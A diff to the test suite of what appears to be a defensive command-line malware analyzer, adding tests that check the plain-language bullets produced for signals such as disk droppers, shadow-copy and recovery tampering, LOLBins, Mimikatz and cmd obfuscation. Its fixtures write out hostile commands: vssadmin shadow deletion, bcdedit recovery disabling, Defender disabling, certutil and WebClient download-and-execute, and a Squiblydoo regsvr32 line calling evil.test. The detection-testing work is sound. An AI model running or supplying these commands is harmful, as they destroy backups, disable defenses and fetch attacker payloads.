@@ -121,14 +121,20 @@ describe('deriveBullets — fetch/execute family, resolved vs inferred, method-n
     const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], signals)
     expect(bullets.some((b) => b.text === 'Fetches a command via for /f or finger and executes its output')).toBe(true)
   })
+
+  it('a disk-dropper signal fires the downloads-to-disk-and-executes bullet (review 2.2)', () => {
+    const signals = [sig('disk-dropper', { techniqueIds: ['T1105', 'T1059.001'] })]
+    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], signals)
+    expect(bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(true)
+  })
 })
 
 describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SOC must-fix #1)', () => {
   const LOLBIN_EXPECT: Record<string, string> = {
     certutil: 'Decodes/downloads a payload via certutil',
     bitsadmin: 'Fetches a file via bitsadmin/BITS transfer',
-    regsvr32: 'Registers and executes a remote script via regsvr32 (Squiblydoo)',
-    rundll32: 'Executes code via rundll32',
+    regsvr32: 'Executes regsvr32 against a remote target',
+    rundll32: 'Executes code via a rundll32 proxy invocation',
     wmic: 'Executes via wmic',
   }
   for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
@@ -184,6 +190,45 @@ describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-
     )
     expect(twoFlags.find((b) => b.verb === 'Runs')!.text).toBe('Runs with evasion flags (hidden, no-profile)')
     expect(twoFlags.find((b) => b.verb === 'Runs')!.text).not.toContain('execution-policy bypass')
+  })
+
+  it('shadow-copy-delete and recovery-disable are independent rules, each naming only its own resolved sub-fact (T1490 review 2.4 fix-up)', () => {
+    // bcdedit-only: recovery-disable fires; shadow-copy-delete must NOT
+    // (it has nothing of its own to resolve here) — no fabricated
+    // "shadow copies" claim on an input that never mentioned any.
+    const bcdOnly = deriveBullets(
+      buildContext('bcdedit /set {default} recoveryenabled no', [], 'powershell'),
+      [], [], [sig('shadow-recovery-tamper')],
+    )
+    expect(bcdOnly.some((b) => b.text === 'Disables Windows automatic recovery (bcdedit)')).toBe(true)
+    expect(bcdOnly.some((b) => /shadow copies/i.test(b.text))).toBe(false)
+
+    // vssadmin-only: shadow-copy-delete fires; recovery-disable must NOT
+    // (no bcdedit clause present) — no fabricated "recovery" claim.
+    const vssadminOnly = deriveBullets(
+      buildContext('vssadmin delete shadows /all /quiet', [], 'powershell'),
+      [], [], [sig('shadow-recovery-tamper')],
+    )
+    expect(vssadminOnly.some((b) => b.text === 'Deletes volume shadow copies — destroys ransomware rollback')).toBe(true)
+    expect(vssadminOnly.some((b) => /bcdedit/i.test(b.text) || /recovery/i.test(b.text))).toBe(false)
+
+    // wbadmin system-state-backup deletion resolves its OWN specific branch
+    // text, not the vssadmin/shadow-copy wording and not a slash-hedge.
+    const wbadminStateBackup = deriveBullets(
+      buildContext('wbadmin delete systemstatebackup -deleteoldest', [], 'powershell'),
+      [], [], [sig('shadow-recovery-tamper')],
+    )
+    expect(wbadminStateBackup.some((b) => b.text === 'Deletes system-state backups — destroys recovery data')).toBe(true)
+    expect(wbadminStateBackup.some((b) => b.text.includes(' / '))).toBe(false)
+
+    // both firing at once — independent, and both facts stated cleanly.
+    const both = deriveBullets(
+      buildContext('vssadmin delete shadows /all /quiet ; bcdedit /set {default} recoveryenabled no', [], 'powershell'),
+      [], [], [sig('shadow-recovery-tamper')],
+    )
+    expect(both.some((b) => b.text === 'Deletes volume shadow copies — destroys ransomware rollback')).toBe(true)
+    expect(both.some((b) => b.text === 'Disables Windows automatic recovery (bcdedit)')).toBe(true)
+    expect(both.some((b) => b.text.includes(' / '))).toBe(false)
   })
 })
 
@@ -245,11 +290,30 @@ describe('deriveBullets — inject/persist/beacon families', () => {
   })
 })
 
+describe('deriveBullets — offensive-tool-run bullet (execute family)', () => {
+  it('names the matched tool from the signal trigger', () => {
+    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('offensive-tool', { trigger: 'Invoke-Mimikatz -DumpCreds' })])
+    const runs = bullets.find((x) => x.text.includes('offensive/credential-theft'))
+    expect(runs).toBeTruthy()
+    expect(runs!.text).toBe('Runs a named offensive/credential-theft tool (Invoke-Mimikatz -DumpCreds)')
+  })
+})
+
 describe('deriveBullets — WSH honesty signals quarantine to opaque', () => {
   it('wsh-decode-limits and wsh-concat-eval-present both render opaque-tier bullets', () => {
     const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], [sig('wsh-decode-limits'), sig('wsh-concat-eval-present')])
     expect(bullets).toHaveLength(2)
     expect(bullets.every((b) => b.confidence === 'opaque')).toBe(true)
+  })
+})
+
+describe('deriveBullets — cmd-var-obfuscation honesty notice quarantines to opaque (review 2.5, mirrors wsh-not-resolved)', () => {
+  it('renders a single opaque-tier bullet naming the obfuscation, never promoted', () => {
+    const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], [sig('cmd-var-obfuscation', { techniqueIds: ['T1140', 'T1027'] })])
+    expect(bullets).toHaveLength(1)
+    expect(bullets[0].confidence).toBe('opaque')
+    expect(bullets[0].text).toContain('cmd variable-substitution obfuscation')
+    expect(bullets[0].techniqueIds).toEqual(['T1140', 'T1027'])
   })
 })
 
@@ -300,6 +364,10 @@ describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', 
       'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
       "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
       'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
+      // Minor (Task 17 review): exercise the cmd-var-obfuscation-notice
+      // bullet's own copy through the D6 sweep — it was previously only
+      // manually inspected, never run through this assertion.
+      'cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"',
     ]
     for (const input of fixtures) {
       const r = await analyze(input)
@@ -310,12 +378,13 @@ describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', 
 
 describe('coverage discipline (D5/D6): every signal maps to a bullet', () => {
   const ALL_SIGNAL_IDS = [
-    'download-cradle', 'cmd-cradle', 'evasion-cluster', 'amsi-reflection', 'amsi-memory-patch',
-    'etw-tamper', 'defender-tamper', 'clickfix', 'beaconing', 'reverse-shell', 'fileless-loader',
+    'download-cradle', 'disk-dropper', 'cmd-cradle', 'evasion-cluster', 'amsi-reflection', 'amsi-memory-patch',
+    'etw-tamper', 'defender-tamper', 'shadow-recovery-tamper', 'clickfix', 'beaconing', 'reverse-shell', 'fileless-loader',
     'persistence', 'lolbin', 'mshta-interpreter', 'wsh-script-exec', 'wsh-decode-limits', 'wsh-concat-eval-present',
+    'offensive-tool', 'cmd-var-obfuscation',
   ]
 
-  it('lists exactly the 17 signal ids defined in techniques.ts (fails loudly if the signal catalog changes without a matching bullets.ts update)', () => {
+  it('lists exactly the 21 signal ids defined in techniques.ts (fails loudly if the signal catalog changes without a matching bullets.ts update)', () => {
     expect(TECHNIQUE_RULES.map((r) => r.id).sort()).toEqual([...ALL_SIGNAL_IDS].sort())
   })
 
@@ -334,6 +403,15 @@ describe('coverage discipline (D5/D6): every signal maps to a bullet', () => {
     if (id === 'defender-tamper') {
       const ctx = buildContext('Set-MpPreference -DisableRealtimeMonitoring $true', [], 'powershell')
       expect(deriveBullets(ctx, [], [], [sig('defender-tamper')]).length).toBeGreaterThan(0)
+      return
+    }
+    if (id === 'shadow-recovery-tamper') {
+      // The split shadow-copy-delete/recovery-disable bullets each re-test
+      // ctx for their own resolved sub-fact (no fabricated hedge) — the
+      // generic 'Register-ScheduledTask' fixture below carries neither, so
+      // this id needs its own corpus like clickfix/lolbin/defender-tamper above.
+      const ctx = buildContext('vssadmin delete shadows /all /quiet', [], 'powershell')
+      expect(deriveBullets(ctx, [], [], [sig('shadow-recovery-tamper')]).length).toBeGreaterThan(0)
       return
     }
     const ctx = buildContext('Register-ScheduledTask', [], 'powershell') // corpus content only matters for persistence's mechanism-naming branch
@@ -489,5 +567,40 @@ describe('whole-branch review regressions (2026-08-19)', () => {
     const evade = r.bullets.find((b) => b.verb === 'Runs')
     expect(evade).toBeTruthy()
     expect(evade!.text).toBe('Runs with evasion flags (hidden, no-profile)')
+  })
+})
+
+describe('LOLBin narrative no-invent (review 2.3, sample 7)', () => {
+  it('benign regsvr32 /u produces NO regsvr32 bullet', async () => {
+    const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
+    expect(r.bullets.some((b) => /regsvr32/i.test(b.text))).toBe(false)
+  })
+  it('real Squiblydoo produces the Squiblydoo bullet', async () => {
+    const r = await analyze('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')
+    expect(r.bullets.some((b) => /squiblydoo/i.test(b.text))).toBe(true)
+  })
+})
+
+describe('disk-dropper false-positive fixes (Task 13 review), verified end-to-end through the real analyze() pipeline', () => {
+  it('review fix (a): a fully-qualified fetch tool name sitting at corpus position 0 (certutil.exe / powershell.exe) does NOT fire disk-dropper on a pure fetch-to-disk with no execution', async () => {
+    const r1 = await analyze('certutil.exe -urlcache -split -f http://x.test/a.exe destination.exe')
+    expect(r1.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r1.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+
+    const r2 = await analyze('powershell.exe -Command "iwr http://e/a.exe -OutFile a.exe"')
+    expect(r2.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r2.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+  })
+
+  it('review fix (b): a benign fetch-to-disk whose corpus merely contains "ascii" (Out-File -Encoding ascii) does NOT fire disk-dropper', async () => {
+    const r = await analyze('certutil -urlcache -split -f http://x.test/a.exe a.exe; Out-File -Encoding ascii report.txt')
+    expect(r.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+  })
+
+  it('the genuine dropper still fires disk-dropper and its bullet end to end, post-fix', async () => {
+    const r = await analyze("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")
+    expect(r.signals.some((s) => s.id === 'disk-dropper')).toBe(true)
+    expect(r.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(true)
   })
 })
